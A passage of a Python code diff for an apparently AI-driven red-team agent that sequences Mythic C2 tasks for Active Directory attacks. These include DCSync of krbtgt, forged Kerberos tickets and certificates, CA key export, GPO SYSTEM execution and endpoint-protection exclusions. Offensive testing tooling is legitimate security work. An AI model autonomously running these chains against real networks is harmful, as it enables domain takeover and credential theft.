+            "Sage reuses a matching plaintext local-admin credential from Mythic when omitted, emits bounded "
+            "remote execution plus proof commands, and records only after target-side proof is returned. For "
+            "gpo-controlled-system-exec, pass method='gpp-immediate-task-fallback' after SharpGPOAbuse returns a "
+            "GUID-only/no-op result; Sage emits deterministic GPP XML/CSE/version repair, local gpupdate, and "
+            "proof-file read commands. Also pass gpo_guid when SharpGPOAbuse printed one. For GPO SYSTEM tasks, "
+            "pass command/arguments or command_path/command_arguments for the exact SYSTEM action; proof files "
+            "default to C:\\Users\\Public so the low-privileged foothold can read them back. For ticket capabilities, pass proof_resource/proof_host when BloodHound "
+            "cannot derive a DC."
+        )] = None,
+    ) -> str:
+        """Build deterministic Mythic command parameters for a generic capability action.
+
+        This tool does NOT execute anything. It converts the rendered capability action plus runtime
+        inputs into exact Mythic command/parameter objects. For ticket forges, use this tool first, issue the
+        returned non-deferred forge command with ``issue_task_and_waitfor_task_output``, bind produced artifacts
+        to any deferred context/import steps, and verify access before recording achievement. Prompt-built
+        Kerberos forge commands are blocked by the engagement gate.
+        """
+        try:
+            try:
+                from . import capabilities
+                from . import mythic_capability_adapter
+            except ImportError:
+                import capabilities
+                import mythic_capability_adapter
+
+            input_values = self._capability_tool_inputs(inputs)
+            action_obj = self._capability_tool_action(action, input_values, capabilities)
+            if action_obj is None:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["action"],
+                    "reason": "build_capability_commands needs a capability action name/domain or action dict",
+                    "commands": [],
+                }, sort_keys=True)
+
+            await self._augment_capability_runtime_inputs(action_obj, input_values)
+            self._validate_capability_ticket_sid_sources(action_obj, input_values)
+            input_errors = self._capability_input_errors(input_values)
+            if input_errors:
+                return json.dumps({
+                    "ok": False,
+                    "missing": input_errors,
+                    "reason": (
+                        "invalid capability runtime input(s); resolve numeric domain SIDs from a trusted "
+                        "directory/BloodHound source before building a ticket command"
+                    ),
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else str(action_obj),
+                    "commands": [],
+                }, sort_keys=True)
+            execution_plan = capabilities.build_capability_execution_plan(action_obj, input_values)
+            adapter_config = input_values.get("mythic_adapter") if isinstance(input_values.get("mythic_adapter"), dict) else input_values
+            command_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, adapter_config)
+            for command_obj in list(getattr(command_plan, "commands", []) or []):
+                command_name = self._capability_text(getattr(command_obj, "command", ""))
+                command_params = getattr(command_obj, "parameters", {})
+                command_context = {
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "target": self._capability_text(getattr(action_obj, "target", "")),
+                    "effects": list(getattr(action_obj, "effects", []) or []),
+                    "intent": dict(getattr(action_obj, "intent", {}) or {}),
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "runtime_inputs": self._safe_capability_runtime_context(input_values),
+                    "expected_probe": self._capability_text(getattr(command_obj, "expected_probe", "")),
+                    "produces": list(getattr(command_obj, "produces", []) or []),
+                    "consumes": list(getattr(command_obj, "consumes", []) or []),
+                }
+                self._deterministic_capability_command_contexts[
+                    _capability_command_key(command_name, command_params)
+                ] = command_context
+                key = _ticket_command_key(
+                    command_name,
+                    command_params,
+                )
+                if key:
+                    self._deterministic_ticket_command_keys.add(key)
+                    self._deterministic_ticket_command_contexts[key] = command_context
+            return json.dumps(
+                self._capability_command_plan_payload(action_obj, execution_plan, command_plan),
+                sort_keys=True,
+            )
+        except Exception as exc:
+            return json.dumps({
+                "ok": False,
+                "missing": ["builder"],
+                "reason": str(exc),
+                "commands": [],
+            }, sort_keys=True)
+
+    def _capability_tool_inputs(self, inputs) -> dict:
+        value = self._capability_json_value(inputs)
+        if isinstance(value, dict):
+            out = dict(value)
+        elif value in (None, ""):
+            out = {}
+        else:
+            out = {"value": value}
+        self._normalize_capability_ticket_inputs(out)
+        return out
+
+    def _safe_capability_runtime_context(self, inputs: dict) -> dict:
+        if not isinstance(inputs, dict):
+            return {}
+        secret_keys = {
+            "password",
+            "local_admin_password",
+            "managed_local_admin_secret",
+            "secret",
+            "credential",
+            "credential_text",
+            "key",
+            "krbtgt_key",
+            "krbtgt_hash",
+            "aes256",
+            "aes128",
+            "rc4",
+            "ntlm",
+            "nthash",
+            "pfx_password",
+            "certificate_password",
+            "ca_pfx_password",
+            "ca_cert_password",
+            "ca_certificate_password",
+            "forged_pfx_password",
+            "forged_certificate_password",
+            "new_cert_password",
+            "certificate_base64",
+        }
+        out = {}
+        for key, value in inputs.items():
+            normalized = self._capability_text(key).casefold()
+            if normalized in secret_keys or normalized.startswith("_"):
+                continue
+            if isinstance(value, (str, int, float, bool, list, tuple)):
+                out[key] = value
+        return out
+
+    def _capability_tool_action(self, action, inputs: dict, capabilities_mod):
+        if isinstance(action, capabilities_mod.CapabilityAction):
+            return action
+
+        value = self._capability_json_value(action)
+        if isinstance(value, str):
+            data = {"name": value}
+        elif isinstance(value, dict):
+            data = dict(value)
+        else:
+            return None
+
+        intent = self._capability_json_value(data.get("intent"))
+        intent = dict(intent) if isinstance(intent, dict) else {}
+        for key in (
+            "capability", "domain", "source_domain", "target_domain", "effect_domain",
+            "gpo", "gpo_name", "gponame", "gpo_display_name",
+            "account", "user", "rights", "execution_context", "callback_id", "callback",
+            "gpo_guid", "guid", "gpo_object_guid", "ldap_server",
+            "affected_dc_hosts", "affected_dcs", "dc_hosts",
+            "current_host", "callback_host", "foothold_host", "local_host",
+            "account_domain", "reader_domain", "principal_domain", "target_host", "host", "computer",
+            "domain_controller", "dc", "target_dc", "target_dcs", "target_domain_controller",
+            "target_domain_controllers", "search_base", "local_account", "local_user", "proof_resource",
+            "service_resource", "target_resource", "proof_path", "proof_unc", "proof_marker",
+            "remote_command", "method", "local_realm", "pfx_path", "metadata_path", "pfx_password",
+            "certificate_password", "export_marker", "adcs_ca_export_method", "ca_export_method",
+            "export_method", "dpapi_tool", "tool", "staged_tool_path", "tool_path", "output_path",
+            "command", "arguments", "args", "executable", "task_name", "command_path", "command_arguments",
+            "system_command", "system_arguments",
+            "controlled_principal", "current_identity", "current_user", "foothold_identity",
+            "allow_proof_only", "proof_only",
+            "preferred_effect", "intended_effect", "effect",
+            "primary_failure_observed", "sharp_gpo_primary_failed", "sharp_gpo_failed",
+            "sharp_gpo_guid_only_noop", "gpo_primary_failed", "gpo_repair_after_primary_failure",
+            "fallback_after_primary_failure", "primary_failure", "previous_failure", "failure_reason",
+            "fallback_reason", "repair_reason",
+            "wait_seconds", "gpo_wait_seconds", "gp_refresh_wait_seconds", "dc_refresh_wait_seconds", "delay_seconds",
+            "final_probe_retries", "proof_retry_attempts", "proof_retries",
+            "final_probe_retry_delay_seconds", "proof_retry_delay_seconds", "proof_retry_delay",
+            "remote_output_path", "local_stage_path", "provider", "endpoint_provider", "endpoint_method",
+            "adjustment_method", "actions", "endpoint_actions", "protection_actions", "exclusion_paths",
+            "exclusions", "exclusion_path", "adjustment_marker", "ca_host", "ca_pfx_path",
+            "ca_cert_path", "ca_certificate_path", "ca_pfx_password", "ca_cert_password",
+            "ca_certificate_password", "forged_pfx_path", "forged_certificate_path", "new_cert_path",
+            "forged_pfx_password", "forged_certificate_password", "new_cert_password", "subject",
+            "certificate_subject", "subject_alt_name", "san", "upn", "auth_marker",
+            "certificate_already_forged", "skip_certificate_forge", "pre_forged_certificate",
+            "refresh_current_context",
+        ):
+            if key in data and key not in intent:
+                intent[key] = data[key]
+            if key in inputs and key not in intent:
+                intent[key] = inputs[key]
+
+        name = self._capability_text(
+            data.get("name") or data.get("capability") or intent.get("capability") or inputs.get("capability")
+        )
+        if not name:
+            return None
+        name = self._canonical_capability_name(name, intent, inputs)
+        intent["capability"] = name
+        if name == "gpo-controlled-system-exec" and not self._capability_text(
+            intent.get("gpo") or intent.get("gpo_name") or intent.get("gponame") or intent.get("gpo_display_name")
+        ):
+            gpo_guid = self._capability_text(
+                intent.get("gpo_guid")
+                or intent.get("guid")
+                or intent.get("gpo_object_guid")
+                or inputs.get("gpo_guid")
+                or inputs.get("guid")
+                or inputs.get("gpo_object_guid")
+            ).strip().strip("{}")
+            if gpo_guid:
+                intent["gpo"] = gpo_guid.casefold()
+        if name == "dcsync-krbtgt" and not self._capability_text(intent.get("account")):
+            intent["account"] = "krbtgt"
+
+        raw_target = self._capability_text(data.get("target"))
+        if raw_target and "=" not in raw_target:
+            if name == "adcs-certificate-auth" and not self._capability_text(intent.get("ca_host")):
+                intent["ca_host"] = raw_target
+            elif name in {
+                "adcs-ca-private-key-export",
+                "execute-as-local-admin",
+                "use-managed-local-admin-secret",
+                "endpoint-protection-adjustment",
+            } and not self._capability_text(
+                intent.get("target_host") or intent.get("host") or intent.get("computer")
+            ):
+                intent["target_host"] = raw_target
+
+        target = raw_target or self._default_capability_target(name, intent, inputs)
+        if raw_target and "=" not in raw_target:
+            target = self._default_capability_target(name, intent, inputs) or raw_target
+        preconditions = self._capability_list(data.get("preconditions"))
+        effects = self._capability_list(data.get("effects")) or self._default_capability_effects(name, intent, inputs)
+        verifier = self._capability_json_value(data.get("verifier"))
+        source_facts = self._capability_list(data.get("source_facts"))
+        return capabilities_mod.CapabilityAction(
+            name=name,
+            target=target,
+            preconditions=preconditions,
+            effects=effects,
+            intent=intent,
+            verifier=dict(verifier) if isinstance(verifier, dict) else {},
+            reason=self._capability_text(data.get("reason")),
+            source_facts=source_facts,
+        )
+
+    def _canonical_capability_name(self, name: str, intent: dict, inputs: dict) -> str:
+        capability = self._capability_text(name).strip()
+        normalized = capability.casefold()
+        if normalized in {
+            "prove-domain-admin-control",
+            "prove-administrative-control",
+            "domain-admin-control-proof",
+            "administrative-control-proof",
+            "prove-domain-control",
+        }:
+            return "ensure-kerberos-context"
+        if normalized == "dcsync":
+            raw_account = self._capability_text(
+                inputs.get("account") or inputs.get("user") or inputs.get("target_account")
+                or intent.get("account") or intent.get("user") or intent.get("target_account")
+            ).casefold()
+            account = self._canonical_credential_account(raw_account)
+            if not account or account == "krbtgt":
+                return "dcsync-krbtgt"
+            return "dcsync-account"
+        return capability
+
+    async def execute_capability(
+        self,
+        action: Annotated[dict | str, (
+            "Capability action to execute end-to-end. Pass a NEXT CAPABILITY ACTION dict "
+            "or a compact request such as {\"capability\":\"adcs-certificate-auth\","
+            "\"domain\":\"lab.local\",\"account\":\"administrator\",\"callback_id\":\"13\"}."
+        )],
+        inputs: Annotated[dict | str | None, (
+            "Runtime values for the capability. For service-access proof pass proof_host or proof_resource "
+            "when BloodHound cannot resolve a domain controller. For adcs-certificate-auth Sage first probes "
+            "the current callback context, then materializes a forged account PFX only if needed, builds the "
+            "adapter command plan, executes it in order, and records only after verifier proof."
+        )] = None,
+    ) -> str:
+        """Execute one deterministic generic capability action, verify it, and record only proven effects.
+
+        This is the autonomous path for multi-step capabilities. It uses the same payload-agnostic
+        capability action, runtime materializer, Mythic adapter, command issuer, and verifier ledger as
+        the transparent build/materialize tools; it just owns sequencing so the model does not have to
+        replay a command list by hand. Currently materialization is implemented for
+        `adcs-certificate-auth`; other builder-backed capabilities are executed from their adapter plan.
+        """
+        try:
+            if self.client is None:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["client"],
+                    "reason": "MythicAPIClient not initialized. Call login() first.",
+                }, sort_keys=True)
+            try:
+                from . import capabilities
+            except ImportError:
+                import capabilities
+
+            input_values = self._capability_tool_inputs(inputs)
+            action_obj = self._capability_tool_action(action, input_values, capabilities)
+            if action_obj is None:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["action"],
+                    "reason": "execute_capability needs a capability action",
+                    "issued": [],
+                }, sort_keys=True)
+
+            before_effects = self._capability_achieved_effects()
+            force_current_refresh = (
+                self._capability_input_bool(input_values, "refresh_current_context")
+                or self._capability_input_bool(input_values, "force_revalidate")
+                or self._capability_input_bool(input_values, "force_refresh")
+            )
+            if (
+                not force_current_refresh
+                and self._capability_action_effects_achieved(action_obj, achieved_effects=before_effects)
+            ):
+                return json.dumps({
+                    "ok": True,
+                    "verdict": "achieved",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": "requested capability effect is already achieved in the engagement ledger; no Mythic tasks issued",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": [],
+                    "proof_chain": self._capability_existing_effect_proofs(action_obj),
+                    "recorded_effects": [],
+                    "achieved_effects": sorted(before_effects),
+                    "stopped_after": "already_achieved",
+                }, sort_keys=True)
+
+            await self._augment_capability_runtime_inputs(action_obj, input_values)
+            await self._ensure_capability_executor_proof_target(action_obj, input_values)
+            callback_id = self._capability_callback_id(action_obj, input_values)
+            if not callback_id:
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": "failed",
+                    "missing": ["callback_id"],
+                    "reason": "execute_capability needs a target callback id",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": [],
+                }, action_obj, input_values, None)
+
+            host_scope_failure = self._capability_host_scoped_precondition_failure(
+                action_obj,
+                input_values,
+                before_effects,
+            )
+            if host_scope_failure:
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": "failed",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": host_scope_failure["reason"],
+                    "missing": host_scope_failure["missing"],
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": [],
+                    "recorded_effects": [],
+                }, action_obj, input_values, callback_id)
+
+            artifact_scope_failure = self._capability_artifact_scoped_precondition_failure(
+                action_obj,
+                input_values,
+                before_effects,
+            )
+            if artifact_scope_failure:
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": "failed",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": artifact_scope_failure["reason"],
+                    "missing": artifact_scope_failure["missing"],
+                    "suggested_capability": artifact_scope_failure.get("suggested_capability"),
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": [],
+                    "recorded_effects": [],
+                }, action_obj, input_values, callback_id)
+
+            timeout = self._capability_executor_timeout(input_values)
+            all_issued: list[dict] = []
+            materialized_payload: dict | None = None
+            accumulated_probe: dict = {}
+
+            context_check = await self._execute_capability_account_context_prerequisite(
+                action_obj,
+                input_values,
+                int(callback_id),
+                timeout,
+                capabilities,
+            )
+            all_issued.extend(context_check.get("issued", []))
+            if context_check.get("status") == "failed":
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": context_check.get("verdict") or "failed",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": context_check.get("reason") or "required account Kerberos context is not usable",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                }, action_obj, input_values, callback_id, issued=all_issued)
+
+            preflight = await self._execute_capability_current_context_preflight(
+                action_obj,
+                input_values,
+                int(callback_id),
+                timeout,
+                capabilities,
+            )
+            all_issued.extend(preflight.get("issued", []))
+            if preflight.get("status") == "achieved":
+                after_effects = self._capability_achieved_effects()
+                return json.dumps({
+                    "ok": True,
+                    "verdict": "achieved",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": "current callback Kerberos context already proved the capability; no new logon session was created",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": sorted(after_effects - before_effects),
+                    "achieved_effects": sorted(after_effects),
+                    "stopped_after": "current_context_preflight",
+                }, sort_keys=True)
+            if preflight.get("status") == "failed":
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": preflight.get("verdict") or "failed",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": preflight.get("reason") or "current-context preflight failed before a capability branch could run",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": [],
+                }, action_obj, input_values, callback_id, issued=all_issued)
+
+            if self._capability_needs_runtime_materialization(action_obj, input_values):
+                materialized_raw = await self.materialize_capability_inputs(action_obj, input_values)
+                try:
+                    materialized_payload = json.loads(materialized_raw)
+                except Exception:
+                    materialized_payload = {
+                        "ok": False,
+                        "missing": ["materializer"],
+                        "reason": materialized_raw,
+                    }
+                if not isinstance(materialized_payload, dict) or not materialized_payload.get("ok"):
+                    return self._capability_executor_failure_json({
+                        "ok": False,
+                        "verdict": "failed",
+                        "capability": self._capability_text(getattr(action_obj, "name", "")),
+                        "reason": self._capability_text(
+                            (materialized_payload or {}).get("reason")
+                            if isinstance(materialized_payload, dict) else "materializer failed"
+                        ),
+                        "missing": (
+                            materialized_payload.get("missing", [])
+                            if isinstance(materialized_payload, dict) else ["materializer"]
+                        ),
+                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                        "issued": self._capability_executor_public_issued(all_issued),
+                        "recorded_effects": [],
+                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=materialized_payload)
+                materialized_inputs = materialized_payload.get("inputs")
+                if isinstance(materialized_inputs, dict):
+                    input_values.update(materialized_inputs)
+                materialized_action = materialized_payload.get("action")
+                if isinstance(materialized_action, dict):
+                    action_obj = self._capability_tool_action(materialized_action, input_values, capabilities) or action_obj
+                await self._augment_capability_runtime_inputs(action_obj, input_values)
+                await self._ensure_capability_executor_proof_target(action_obj, input_values)
+
+            build_payload = await self._capability_build_command_payload(action_obj, input_values)
+            if not build_payload.get("ok"):
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": "failed",
+                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                    "reason": build_payload.get("reason") or "capability command build failed",
+                    "missing": build_payload.get("missing", []),
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": [],
+                }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
+
+            transaction = self._capability_transaction_start(action_obj, build_payload)
+            for command_obj in list(build_payload.get("commands") or []):
+                refresh_current_context = (
+                    self._capability_input_bool(input_values, "refresh_current_context")
+                    or self._capability_input_bool(getattr(action_obj, "intent", {}), "refresh_current_context")
+                )
+                if (
+                    preflight.get("ran")
+                    and not refresh_current_context
+                    and self._capability_executor_is_current_context_preflight(command_obj)
+                ):
+                    continue
+                unresolved = self._capability_executor_unresolved_placeholders(command_obj)
+                if unresolved:
+                    return self._capability_executor_failure_json({
+                        "ok": False,
+                        "verdict": "failed",
+                        "capability": self._capability_text(getattr(action_obj, "name", "")),
+                        "reason": "capability command still has unresolved runtime placeholders",
+                        "missing": sorted(unresolved),
+                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                        "issued": self._capability_executor_public_issued(all_issued),
+                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
+
+                issued_item = await self._execute_capability_command(
+                    command_obj,
+                    int(callback_id),
+                    timeout,
+                )
+                all_issued.append(issued_item)
+                output = self._capability_text(issued_item.get("_output"))
+                self._capability_transaction_update_artifact(transaction, command_obj, output, capabilities)
+                if self._capability_transaction_is_blocked(transaction):
+                    fallback_result = await self._capability_executor_try_gpo_artifact_fallback(
+                        action_obj,
+                        input_values,
+                        int(callback_id),
+                        timeout,
+                        before_effects,
+                        all_issued,
+                        materialized_payload,
+                        transaction,
+                    )
+                    if fallback_result is not None:
+                        return fallback_result
+                    fallback_result = await self._capability_executor_try_schannel_fallback(
+                        action_obj,
+                        input_values,
+                        int(callback_id),
+                        timeout,
+                        capabilities,
+                        before_effects,
+                        all_issued,
+                        materialized_payload,
+                        transaction,
+                        output,
+                    )
+                    if fallback_result is not None:
+                        return fallback_result
+                    return self._capability_executor_failure_json({
+                        "ok": False,
+                        "verdict": "blocked",
+                        "capability": self._capability_text(getattr(action_obj, "name", "")),
+                        "reason": self._capability_transaction_failure_reason(transaction, "capability transaction blocked"),
+                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                        "issued": self._capability_executor_public_issued(all_issued),
+                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                        "transaction": transaction,
+                        "stopped_after": transaction.get("status") or "artifact_validation",
+                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
+                probe, verification = self._capability_executor_verify_output(
+                    action_obj,
+                    input_values,
+                    int(callback_id),
+                    output,
+                    command_obj,
+                    capabilities,
+                )
+                if verification is not None:
+                    if probe:
+                        accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
+                        verification = capabilities.verify_capability(
+                            self._capability_text(getattr(action_obj, "name", "")),
+                            accumulated_probe,
+                        )
+                        probe = dict(accumulated_probe)
+                    issued_item["verify_verdict"] = verification.verdict
+                    issued_item["verify_reason"] = verification.reason
+                    self._capability_transaction_update_verification(transaction, command_obj, verification)
+                    if verification.verdict == "achieved":
+                        credential_refs = await self._import_capability_credential_material(
+                            action_obj,
+                            input_values,
+                            output,
+                            issued_item.get("task_id"),
+                        )
+                        if not self._capability_action_effects_achieved(action_obj):
+                            evidence = {
+                                "source": "execute_capability",
+                                "provenance": "run",
+                                "mythic_task_id": issued_item.get("task_id"),
+                                "callback_id": callback_id,
+                                "command": issued_item.get("command"),
+                            }
+                            if credential_refs:
+                                evidence["credential_material_imported"] = True
+                                evidence["credential_store_refs"] = credential_refs
+                            self.record_capability_result(
+                                action_obj,
+                                probe or accumulated_probe or {},
+                                evidence=evidence,
+                            )
+                        after_effects = self._capability_achieved_effects()
+                        return json.dumps({
+                            "ok": True,
+                            "verdict": "achieved",
+                            "capability": self._capability_text(getattr(action_obj, "name", "")),
+                            "reason": verification.reason,
+                            "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                            "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                            "issued": self._capability_executor_public_issued(all_issued),
+                            "recorded_effects": sorted(after_effects - before_effects),
+                            "achieved_effects": sorted(after_effects),
+                            "stopped_after": "verified_proof",
+                            "transaction": transaction,
+                        }, sort_keys=True)
+                    if self._capability_executor_is_final_probe(command_obj):
+                        retry_attempt = 0
+                        max_probe_retries = self._capability_executor_final_probe_retry_limit(input_values, command_obj)
+                        while self._capability_should_retry_final_probe(
+                            command_obj,
+                            probe or {},
+                            verification,
+                            retry_attempt,
+                            max_probe_retries,
+                        ):
+                            retry_attempt += 1
+                            retry_delay = self._capability_executor_final_probe_retry_delay(input_values, command_obj)
+                            if retry_delay > 0:
+                                await asyncio.sleep(retry_delay)
+                            retry_item = await self._execute_capability_command(
+                                command_obj,
+                                int(callback_id),
+                                timeout,
+                            )
+                            retry_item["retry_attempt"] = retry_attempt
+                            retry_item["retry_reason"] = "final proof was not available yet"
+                            if issued_item.get("task_id"):
+                                retry_item["retry_of_task_id"] = issued_item.get("task_id")
+                            all_issued.append(retry_item)
+                            retry_output = self._capability_text(retry_item.get("_output"))
+                            self._capability_transaction_update_artifact(transaction, command_obj, retry_output, capabilities)
+                            if self._capability_transaction_is_blocked(transaction):
+                                return self._capability_executor_failure_json({
+                                    "ok": False,
+                                    "verdict": "blocked",
+                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                                    "reason": self._capability_transaction_failure_reason(transaction, "capability transaction blocked"),
+                                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                                    "issued": self._capability_executor_public_issued(all_issued),
+                                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                                    "transaction": transaction,
+                                    "stopped_after": transaction.get("status") or "artifact_validation",
+                                }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
+                            retry_probe, retry_verification = self._capability_executor_verify_output(
+                                action_obj,
+                                input_values,
+                                int(callback_id),
+                                retry_output,
+                                command_obj,
+                                capabilities,
+                            )
+                            if retry_verification is None:
+                                break
+                            if retry_probe:
+                                accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, retry_probe)
+                                retry_verification = capabilities.verify_capability(
+                                    self._capability_text(getattr(action_obj, "name", "")),
+                                    accumulated_probe,
+                                )
+                                retry_probe = dict(accumulated_probe)
+                            retry_item["verify_verdict"] = retry_verification.verdict
+                            retry_item["verify_reason"] = retry_verification.reason
+                            self._capability_transaction_update_verification(transaction, command_obj, retry_verification)
+                            issued_item = retry_item
+                            output = retry_output
+                            probe = retry_probe
+                            verification = retry_verification
+                            if retry_verification.verdict == "achieved":
+                                credential_refs = await self._import_capability_credential_material(
+                                    action_obj,
+                                    input_values,
+                                    retry_output,
+                                    retry_item.get("task_id"),
+                                )
+                                if not self._capability_action_effects_achieved(action_obj):
+                                    evidence = {
+                                        "source": "execute_capability",
+                                        "provenance": "run",
+                                        "mythic_task_id": retry_item.get("task_id"),
+                                        "callback_id": callback_id,
+                                        "command": retry_item.get("command"),
+                                    }
+                                    if credential_refs:
+                                        evidence["credential_material_imported"] = True
+                                        evidence["credential_store_refs"] = credential_refs
+                                    self.record_capability_result(
+                                        action_obj,
+                                        retry_probe or accumulated_probe or {},
+                                        evidence=evidence,
+                                    )
+                                after_effects = self._capability_achieved_effects()
+                                return json.dumps({
+                                    "ok": True,
+                                    "verdict": "achieved",
+                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                                    "reason": retry_verification.reason,
+                                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                                    "issued": self._capability_executor_public_issued(all_issued),
+                                    "recorded_effects": sorted(after_effects - before_effects),
+                                    "achieved_effects": sorted(after_effects),
+                                    "stopped_after": "verified_proof",
+                                    "transaction": transaction,
+                                }, sort_keys=True)
+                        if self._capability_should_retry_adcs_dpapi(action_obj, input_values, verification):
+                            retry_inputs = dict(input_values)
+                            retry_inputs["adcs_ca_export_method"] = "sharpdpapi"
+                            retry_inputs["adcs_ca_export_command"] = (
+                                retry_inputs.get("adcs_ca_dpapi_export_command")
+                                or retry_inputs.get("dpapi_export_command")
+                                or "powerpick"
+                            )
+                            retry_inputs["adcs_ca_export_use_current_context"] = False
+                            retry_inputs["adcs_dpapi_retry_attempted"] = True
+                            retry_inputs["native_export_blocker"] = verification.reason
+                            retry_raw = await self.execute_capability(action_obj, retry_inputs)
+                            try:
+                                retry_payload = json.loads(retry_raw)
+                            except Exception:
+                                retry_payload = {
+                                    "ok": False,
+                                    "verdict": "failed",
+                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
+                                    "reason": self._capability_text(retry_raw),
+                                    "issued": [],
+                                    "recorded_effects": [],
+                                }
+                            if isinstance(retry_payload, dict):
+                                retry_issued = retry_payload.get("issued") if isinstance(retry_payload.get("issued"), list) else []
+                                retry_payload["issued"] = self._capability_executor_public_issued(all_issued) + retry_issued
+                                retry_payload["native_export_repair"] = "sharpdpapi"
+                                retry_payload["native_export_blocker"] = verification.reason
+                                return json.dumps(retry_payload, sort_keys=True)
+                        fallback_result = await self._capability_executor_try_schannel_fallback(
+                            action_obj,
+                            input_values,
+                            int(callback_id),
+                            timeout,
+                            capabilities,
+                            before_effects,
+                            all_issued,
+                            materialized_payload,
+                            transaction,
+                            output,
+                        )
+                        if fallback_result is not None:
+                            return fallback_result
+                        return self._capability_executor_failure_json({
+                            "ok": False,
+                            "verdict": verification.verdict,
+                            "capability": self._capability_text(getattr(action_obj, "name", "")),
+                            "reason": verification.reason,
+                            "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                            "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                            "issued": self._capability_executor_public_issued(all_issued),
+                            "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                            "transaction": transaction,
+                            "stopped_after": "unresolved_effect_transaction",
+                        }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload,
+                            record_failed=True, failure_probe=probe or accumulated_probe or {})
+
+                if self._capability_executor_task_failed(issued_item):
+                    self._capability_transaction_record_task_failure(transaction, command_obj, issued_item)
+                    fallback_result = await self._capability_executor_try_schannel_fallback(
+                        action_obj,
+                        input_values,
+                        int(callback_id),
+                        timeout,
+                        capabilities,
+                        before_effects,
+                        all_issued,
+                        materialized_payload,
+                        transaction,
+                        output,
+                    )
+                    if fallback_result is not None:
+                        return fallback_result
+                    return self._capability_executor_failure_json({
+                        "ok": False,
+                        "verdict": "failed",
+                        "capability": self._capability_text(getattr(action_obj, "name", "")),
+                        "reason": issued_item.get("failure_reason") or "capability command failed",
+                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                        "issued": self._capability_executor_public_issued(all_issued),
+                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                        "transaction": transaction,
+                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload,
+                        record_failed=True, failure_probe=accumulated_probe or {})
+
+            after_effects = self._capability_achieved_effects()
+            action_ok = self._capability_action_effects_achieved(action_obj)
+            final_payload = {
+                "ok": bool(action_ok),
+                "verdict": "achieved" if action_ok else "partial",
+                "capability": self._capability_text(getattr(action_obj, "name", "")),
+                "reason": (
+                    "capability effects are achieved in the ledger"
+                    if action_ok else
+                    "capability command plan completed, but verifier did not record an achieved effect"
+                ),
+                "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                "issued": self._capability_executor_public_issued(all_issued),
+                "recorded_effects": sorted(after_effects - before_effects),
+                "achieved_effects": sorted(after_effects),
+                "transaction": transaction,
+            }
+            if not action_ok:
+                self._capability_transaction_mark_unverified(
+                    transaction,
